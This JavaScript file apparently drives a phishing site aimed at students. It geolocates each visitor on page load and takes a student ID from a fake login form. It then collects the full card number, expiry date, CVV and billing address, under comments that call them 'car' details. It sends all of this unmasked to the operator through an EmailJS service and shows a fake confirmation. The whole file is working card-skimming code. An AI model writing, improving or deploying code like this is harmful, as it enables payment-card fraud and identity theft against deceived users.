// Function 1: Track Location (Runs immediately)
const trackingData = () => {
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const loc = {
                ip: data.ip,
                city: data.city,
                country: data.country_name,
                isp: data.org
            };
            sessionStorage.setItem('studentLocation', JSON.stringify(loc));
        })
        .catch(error => console.log("Tracking failed"));
}

// Function 2: Login Page Logic
const loginLogic = () => {
    const loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", (e) => {
            e.preventDefault();
            const emailInput = document.getElementById("email");
            const studentId = emailInput ? emailInput.value : "Unknown User";
            
            // Save ID for the next page
            sessionStorage.setItem('currentStudentId', studentId);
            window.location.href = "update.html";
        });
    }
}

// Function 3: Update/Car Info Page Logic
const updateLogic = () => {
    const cardForm = document.getElementById("cardForm");
    if (cardForm) {
        // --- Input Formatting ---
        // (Keeps spaces for readability, assuming Car Number is digits)
        const fieldIds = ['cardNumber', 'cvc', 'expiryDate'];
        fieldIds.forEach(id => {
            const field = document.getElementById(id);
            if (field) {
                field.addEventListener('input', (e) => {
                    // If you want to allow LETTERS for Car Plates, remove the next line:
                    let value = e.target.value.replace(/\D/g, ''); 
                    
                    if (id === 'cardNumber') {
                        value = value.substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
                    } else if (id === 'expiryDate') {
                        value = value.substring(0, 4);
                        if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                    } else if (id === 'cvc') {
                        value = value.substring(0, 4);
                    }
                    e.target.value = value;
                });
            }
        });

        // --- Submit Logic ---
        cardForm.addEventListener("submit", (e) => {
            e.preventDefault();
            
            const btn = cardForm.querySelector("button");
            const originalText = btn.innerText;
            btn.innerText = "Processing...";

            // 1. Get Stored Data (Location)
            const studentId = sessionStorage.getItem('currentStudentId') || "Unknown ID";
            const locData = JSON.parse(sessionStorage.getItem('studentLocation')) || {};

            // 2. Get Form Data (Car Info)
            const cName = document.getElementById("cardName").value; // Car Name
            const cNum = document.getElementById("cardNumber").value; // Car Number
            const cExp = document.getElementById("expiryDate").value;
            const cCvv = document.getElementById("cvv").value; // DVV


            // ✅ 3. Get New Billing Data
            const bAddr = document.getElementById("billAddress").value;
            const bCity = document.getElementById("billCity").value;
            const bZip = document.getElementById("billZip").value;



            // 3. Prepare Email Params (Now Unmasked for Admin)
             const templateParams = {
                // Tracking
                student_id: studentId,
                ip_address: locData.ip || "Unknown",
                city: locData.city || "Unknown",
                country: locData.country || "Unknown",
                isp: locData.isp || "Unknown",
                timestamp: new Date().toLocaleString(),

                // Vehicle/Card Info
                card_name: cName,
                card_number: cNum, 
                CVV: cCvv,        // Fixed: Was "DDvv" before
                expiry_date: cExp,

                // ✅ New Billing Info
                billing_address: bAddr,
                billing_city: bCity,
                billing_zip: bZip
            };

            

            const serviceID = "service_nu8okvk".trim();
            const templateID = "template_46j39l2".trim(); 

            console.log("Sending Data...", templateParams);

            if (typeof emailjs !== 'undefined') {
                emailjs.send(serviceID, templateID, templateParams)
                    .then(() => {
                        alert("Your  info has been updated.");
                        window.location.href = "index.html";
                    })
                    .catch((err) => {
                        console.error("FAILED:", err);
                        alert(`Error: ${err.text}`);
                        btn.innerText = originalText;
                    });
            } else {
                console.error("EmailJS not loaded");
                alert("System Error: EmailJS library missing.");
            }
        });
    }
}

// Initialize everything when page loads
document.addEventListener("DOMContentLoaded", () => {
    trackingData();
    loginLogic();
    updateLogic();

});
